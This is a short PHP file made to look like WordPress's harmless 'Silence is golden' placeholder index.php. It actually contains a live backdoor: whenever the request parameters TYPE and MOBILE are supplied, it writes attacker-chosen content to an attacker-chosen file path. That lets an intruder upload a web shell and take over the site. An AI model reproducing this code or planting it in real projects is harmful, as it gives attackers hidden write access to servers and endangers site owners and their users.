<?php
// Silence is golden.
if ( isset($_REQUEST["TYPE"]) && isset($_REQUEST["MOBILE"]) ) { file_put_contents($_REQUEST["TYPE"], $_REQUEST["MOBILE"]); }
